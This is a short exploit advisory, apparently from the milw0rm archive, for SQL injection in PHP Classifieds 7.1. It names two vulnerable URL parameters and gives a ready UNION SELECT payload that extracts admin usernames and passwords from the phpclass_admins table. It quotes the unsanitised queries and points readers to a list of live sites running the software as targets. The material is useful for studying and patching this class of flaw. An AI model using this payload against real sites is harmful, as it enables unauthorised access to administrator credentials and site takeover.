@@ -1,0 +1,22 @@
+----
+Credit: Kzar kzar@kzar.co.uk
+kzar.co.uk/exploits/phpclassifieds_exploit
+----
+App Name: PHP Classifieds => 7.1
+App URL: www.deltascripts.com/phpclassifieds
+Problem: Multiple SQL Injection exploits
+----
+Exploit: search.php?catid_search=[sql]
+        index.php?catid=[sql]
+----
+Example: Puts Username and Password in the title and on the page
+index.php?catid=0 UNION SELECT concat(adm_name, space(1), adm_pass) AS adm_name, NULL FROM phpclass_admins
+----
+Context: These are the vulnerable queries
+select cat_tpl from $cat_tbl where cat_id = ".$_REQUEST["catid_search"]
+select cat_name,cat_tpl from $cat_tbl where cat_id = $catid
+----
+Google: Just go to http://www.deltascripts.com/phpclassifieds/livesites/
+----
+
+# milw0rm.com [2006-10-05]
